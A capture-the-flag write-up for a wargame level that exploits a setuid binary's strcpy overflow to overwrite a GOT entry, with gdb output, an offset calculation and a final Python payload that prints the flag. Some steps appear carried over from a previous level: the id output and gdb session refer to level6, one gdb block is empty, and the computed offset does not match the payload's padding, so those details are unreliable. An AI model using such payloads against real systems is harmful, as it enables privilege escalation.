# Level 7

https://perso.liris.cnrs.fr/lionel.brunie/documents/notes-correction-attaque-buffer-overflow.pdf

## 1. Identity

```bash
$ id
uid=2064(level6) gid=2064(level6) groups=2064(level6),100(users)
```

## 2. Home directory

```bash
$ pwd
/home/user/level7

$ ls -la
[...]
-rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7
[...]
```

## 3. Analyzing the file

Testing it :

```bash
$ ./level7 
Segmentation fault (core dumped)
$ ./level7 42
Segmentation fault (core dumped)
$ ./level7 42 42
~~
```

Printf the time and a global variable "0x8049960", the name is "c"

fgets put the result of the fopen on a global string "c", the same of the printf

We need to read this global variable by calling the function m

We can overwrite the puts call by "m" in the GOT using the strcpy overflow

Get the address of puts in the GOT :
```bash
(gdb)

```


Let's test our code with a huge input :
```bash
$ gdb level6

(gdb) run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
Starting program: /home/user/level6/level6 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
0x53535353 in ?? ()
(gdb) info register eip
eip            0x53535353       0x53535353
```

53 = S => offset = 72

The offset of the overflow is 72


## 4. Getting the flag

```bash
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1768409080
```

End of simulation
